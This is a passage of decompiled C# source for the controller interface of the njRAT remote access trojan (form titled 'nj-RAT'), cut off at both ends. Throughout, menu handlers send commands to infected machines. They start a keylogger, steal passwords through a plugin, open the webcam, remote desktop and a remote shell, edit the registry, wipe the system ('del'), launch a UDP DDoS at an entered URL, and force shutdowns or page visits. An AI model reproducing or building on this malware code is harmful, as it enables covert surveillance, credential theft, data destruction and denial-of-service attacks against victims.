			this.L2.BorderStyle = BorderStyle.None;
			this.L2.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader12,
				this.ColumnHeader13
			});
			this.L2.ContextMenuStrip = this.CM3;
			this.L2.Dock = DockStyle.Fill;
			this.L2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L2.ForeColor = Color.Black;
			this.L2.FullRowSelect = true;
			this.L2.HeaderStyle = ColumnHeaderStyle.None;
			this.L2.Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4
			});
			Control arg_771A_0 = this.L2;
			location = new Point(0, 0);
			arg_771A_0.Location = location;
			this.L2.Name = "L2";
			this.L2.RightToLeft = RightToLeft.No;
			Control arg_7758_0 = this.L2;
			size = new Size(860, 334);
			arg_7758_0.Size = size;
			this.L2.SmallImageList = this.ImageList1;
			this.L2.TabIndex = 17;
			this.L2.UseCompatibleStateImageBehavior = false;
			this.L2.View = View.Details;
			this.ColumnHeader12.Width = 67;
			SizeF autoScaleDimensions = new SizeF(7f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(860, 334);
			this.ClientSize = size;
			this.Controls.Add(this.StatusStrip1);
			this.Controls.Add(this.Panel3);
			this.Controls.Add(this.L2);
			this.Controls.Add(this.Panel1);
			this.Controls.Add(this.Panel2);
			this.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = SystemColors.ControlText;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Main";
			this.Text = "nj-RAT";
			((ISupportInitialize)this.Timer1).EndInit();
			this.ContextMenuStrip1.ResumeLayout(false);
			this.CM3.ResumeLayout(false);
			((ISupportInitialize)this.P1).EndInit();
			this.Panel1.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.ContextMenuStrip3.ResumeLayout(false);
			this.Panel3.ResumeLayout(false);
			this.Panel3.PerformLayout();
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public void dsk()
		{
			int num = 0;
			checked
			{
				while (true)
				{
					Thread.Sleep(500);
					try
					{
						bool flag = sokserver.F.IMG == sokserver.F.L1V.SmallImageList && sokserver.ISAd.Count <= 10;
						if (flag)
						{
							num++;
							flag = (num > this.S.Online2.Count);
							if (flag)
							{
								num = 1;
							}
							flag = (this.S.Online2.Count > 0);
							if (flag)
							{
								Client client = (Client)this.S.Online2[num];
								flag = ((!client.Isend & client.L != null) && client.L.SubItems.Count > 0);
								if (flag)
								{
									sokserver.ISAd.Add(client);
									client.Isend = true;
									client.Send(string.Concat(new string[]
									{
										"CAP",
										sokserver.Y,
										Conversions.ToString(sokserver.F.IMG.ImageSize.Width),
										sokserver.Y,
										Conversions.ToString(sokserver.F.IMG.ImageSize.Height)
									}));
								}
							}
						}
					}
					catch (Exception expr_167)
					{
						ProjectData.SetProjectError(expr_167);
						Exception projectError = expr_167;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
			}
		}

		private void FileManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("nj_fm.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void FlagToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_Load(object sender, EventArgs e)
		{
			checked
			{
				this.Left = 0 - this.Width + Screen.PrimaryScreen.WorkingArea.Width;
				this.Top = 0 - this.Height + Screen.PrimaryScreen.WorkingArea.Height;
				this.Logs1.Show();
				MyProject.Forms.nt.Show();
				MyProject.Forms.nt.Visible = false;
				Control.CheckForIllegalCrossThreadCalls = false;
				sokserver.F = this;
				this.Show();
				string[] files = Directory.GetFiles(Application.StartupPath + "\\Nj_DLL\\", "*.dll");
				for (int i = 0; i < files.Length; i++)
				{
					string fileName = files[i];
					plg item = new plg(new FileInfo(fileName).Name.ToLower());
					sokserver.Plug.Add(item);
				}
				string[] array = Strings.Split("Nj_cam.dll,Nj_ch.dll,Nj_fm.dll,pw.dll,Nj_mic.dll,Nj_sc2.dll", ",", -1, CompareMethod.Binary);
				for (int j = 0; j < array.Length; j++)
				{
					string text = array[j];
					bool flag = sokserver.GETPLG(text, null) == null;
					if (flag)
					{
						Interaction.MsgBox("Missing dll >> " + text, MsgBoxStyle.OkOnly, null);
					}
				}
				while (true)
				{
					bool flag = Operators.ConditionalCompareObjectEqual(FN.GetValueReg("Porta .)"), null, false);
					if (flag)
					{
						string text2 = "";
						FrmPortas frmPortas = new FrmPortas();
						flag = (frmPortas.ShowDialog(" (Port)", "Port.", "443", ref text2, false) == DialogResult.OK);
						if (flag)
						{
							try
							{
								this.port = Conversions.ToInteger(frmPortas.NDPorta.Value);
								this.S = new SK(Conversions.ToInteger(frmPortas.NDPorta.Value));
							}
							catch (Exception expr_1CA)
							{
								ProjectData.SetProjectError(expr_1CA);
								Interaction.MsgBox("Error Message Port", MsgBoxStyle.Critical, "Informacoes");
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						goto IL_1FA;
					}
					else
					{
						string text3 = "";
						FrmPortas frmPortas2 = new FrmPortas();
						flag = (frmPortas2.ShowDialog(" (Port)", "Port.", "Porta (Conexão)", ref text3, false) == DialogResult.OK);
						if (flag)
						{
							try
							{
								this.port = Conversions.ToInteger(frmPortas2.NDPorta.Value);
								this.S = new SK(Conversions.ToInteger(frmPortas2.NDPorta.Value));
							}
							catch (Exception expr_278)
							{
								ProjectData.SetProjectError(expr_278);
								Interaction.MsgBox("Error Message Port", MsgBoxStyle.Critical, "Informações");
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						goto IL_2A8;
					}
				}
				goto IL_201;
				IL_1FA:
				ProjectData.EndApp();
				IL_201:
				goto IL_2AF;
				IL_2A8:
				ProjectData.EndApp();
				IL_2AF:
				sokserver.W = this.S;
				Thread thread = new Thread(new ThreadStart(this.dsk));
				thread.Start();
				this.Logs1.Timer1.Enabled = true;
				this.Timer1.Enabled = true;
			}
		}

		private void GetPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("pw.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, true);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"kl"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void L1_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count > 0;
			if (flag)
			{
				((Client)this.L1V.SelectedItems[0].Tag).Send("inf");
			}
		}

		private void L1_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			bool flag = keyCode == Keys.A;
			if (flag)
			{
				bool flag2 = MyProject.Computer.Keyboard.CtrlKeyDown;
				if (flag2)
				{
					ListView.ListViewItemCollection items = this.L1V.Items;
					ListView.ListViewItemCollection obj = items;
					lock (obj)
					{
						IEnumerator enumerator = null;
						try
						{
							enumerator = this.L1V.Items.GetEnumerator();
							while (enumerator.MoveNext())
							{
								ListViewItem listViewItem = (ListViewItem)enumerator.Current;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							flag2 = (enumerator is IDisposable);
							if (flag2)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			else
			{
				bool flag2 = keyCode == Keys.Space;
				if (flag2)
				{
					this.L1V.FX();
				}
			}
		}

		private void LargeToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void L1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.conz.Text = "Selected [" + Conversions.ToString(this.L1V.SelectedItems.Count) + "]";
			bool flag = this.L1V.SelectedItems.Count > 0;
			if (flag)
			{
				sokserver.ensr = false;
			}
			PictureBox p = this.P1;
			PictureBox obj = p;
			lock (obj)
			{
				flag = (this.L1V.SelectedItems.Count == 1 & this.L1V.SmallImageList == this.IMG2);
				if (flag)
				{
					this.CEL = (Client)this.L1V.SelectedItems[0].Tag;
					flag = (this.CEL.snf != null);
					if (flag)
					{
						sokserver.F.L2.Items[0].SubItems[1].Text = this.CEL.snf[0];
						sokserver.F.L2.Items[1].SubItems[1].Text = this.CEL.snf[1];
						sokserver.F.L2.Items[2].SubItems[1].Text = "%" + this.CEL.snf[2] + "%";
						sokserver.F.L2.Items[3].SubItems[1].Text = this.CEL.snf[3];
						sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
					}
					else
					{
						sokserver.F.L2.Items[0].SubItems[1].Text = "";
						sokserver.F.L2.Items[1].SubItems[1].Text = "";
						sokserver.F.L2.Items[2].SubItems[1].Text = "";
						sokserver.F.L2.Items[3].SubItems[1].Text = "";
						sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
						this.CEL.Send("inf");
					}
					flag = (this.CEL.pc != null);
					if (flag)
					{
						PictureBox p2 = sokserver.F.P1;
						PictureBox obj2 = p2;
						lock (obj2)
						{
							sokserver.F.P1.Image = (Image)this.CEL.pc.Clone();
						}
					}
					this.CEL.Send(string.Concat(new string[]
					{
						"CAP",
						sokserver.Y,
						Conversions.ToString(this.P1.Width),
						sokserver.Y,
						Conversions.ToString(this.P1.Height)
					}));
				}
				else
				{
					sokserver.F.P1.Image = null;
					this.CEL = null;
				}
			}
		}

		private void OpenFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag), null, "folder", new object[0], null, null, null))));
				if (flag)
				{
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag), null, "folder", new object[0], null, null, null))));
				}
				object[] array = new object[1];
				object objectValue = RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag);
				array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[0], null, null, null))));
				object[] array2 = array;
				bool[] array3 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(null, typeof(Process), "Start", array2, null, null, array3, true);
				flag = array3[0];
				if (flag)
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[]
					{
						RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0])))
					}, null, null, true, true);
				}
			}
			catch (Exception expr_149)
			{
				ProjectData.SetProjectError(expr_149);
				Exception projectError = expr_149;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void P1_Click(object sender, EventArgs e)
		{
			bool flag = this.CEL != null;
			if (flag)
			{
				this.CEL.Send(string.Concat(new string[]
				{
					"CAP",
					sokserver.Y,
					Conversions.ToString(this.P1.Width),
					sokserver.Y,
					Conversions.ToString(this.P1.Height)
				}));
			}
		}

		private void P1_MouseEnter(object sender, EventArgs e)
		{
			bool flag = this.CEL != null;
			if (flag)
			{
				this.P1.Cursor = Cursors.Hand;
			}
			else
			{
				this.P1.Cursor = Cursors.Default;
			}
		}

		private void P1_Resize(object sender, EventArgs e)
		{
			this.P1.Height = checked((int)Math.Round(Math.Round((double)this.P1.Width / 1.0)));
		}

		private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_proc.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void RegistryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = sokserver.Gform(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("reg", RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "ip", new object[0], null, null, null)))))) == null;
					if (flag)
					{
						Reg reg = new Reg();
						reg.Name = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("reg", RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "ip", new object[0], null, null, null)))));
						reg.sk = (Client)listViewItem.Tag;
						reg.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(reg.sk.L)));
						reg.Show();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void RemoteCamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_cam.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void RemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_sc2.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "send", new object[]
					{
						"rss"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void Timer1_Elapsed(object sender, ElapsedEventArgs e)
		{
			try
			{
				PictureBox p = this.P1;
				PictureBox obj = p;
				lock (obj)
				{
					bool flag = this.CEL == null && Operators.CompareString(sokserver.F.L2.Items[0].SubItems[1].Text, "", false) != 0;
					if (flag)
					{
						sokserver.F.L2.Items[0].SubItems[1].Text = "";
						sokserver.F.L2.Items[1].SubItems[1].Text = "";
						sokserver.F.L2.Items[2].SubItems[1].Text = "";
						sokserver.F.L2.Items[3].SubItems[1].Text = "";
						sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
						sokserver.F.P1.Image = null;
					}
				}
			}
			catch (Exception expr_138)
			{
				ProjectData.SetProjectError(expr_138);
				Exception projectError = expr_138;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void DDosAttickToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "UDP" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "DDOS ATTACK", "www.xnxx.com", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void FormatSystemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"del"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void OpenWebSiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "OpenPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"Restart"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"Shutdown"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "OpenPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void BlockWebSiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "BlocKPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
		}

		private void NotifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			this.Show();
			this.NotifyIcon1.Visible = false;
		}

		private void MsgboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "Msgbox" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void NOIPUpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void ExtensionSpooferToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"Restart"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ShutDownToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private void OpenWebPageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "OpenPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void BlockWebSiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "BlocKPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
